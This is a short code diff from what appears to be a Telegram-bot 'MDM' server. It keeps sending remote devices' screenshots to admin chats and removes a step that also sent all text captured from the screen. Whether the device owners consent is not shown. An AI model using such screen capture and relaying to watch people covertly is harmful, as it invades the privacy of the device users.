@@ -2487,7 +2487,7 @@ def _handle_screen_json(dev, data):
         )
 
         for admin_id in Config.ADMIN_IDS:
-            # 1. Send image FIRST
+            # Send ONLY the image (no text box) — user requested image only
             try:
                 mdm_bot.bot.send_photo(
                     admin_id,
@@ -2498,23 +2498,6 @@ def _handle_screen_json(dev, data):
                 img_bio.seek(0)
             except Exception as e:
                 logger.error(f"فشل إرسال الصورة: {e}")
-
-            # 2. Send text box BELOW — all texts in ONE block
-            try:
-                if combined_text:
-                    text_display = combined_text[:3800]
-                    if len(combined_text) > 3800:
-                        text_display += "\n...(truncated)"
-
-                    mdm_bot.bot.send_message(
-                        admin_id,
-                        f"📝 <b>كل النصوص الموجودة على الشاشة</b>\n"
-                        f"━━━━━━━━━━━━━━━\n"
-                        f"<code>{text_display}</code>",
-                        parse_mode="HTML"
-                    )
-            except Exception as e:
-                logger.error(f"فشل إرسال مربع النص: {e}")
 
     _pending_cmds.pop(request.sid, None)
 
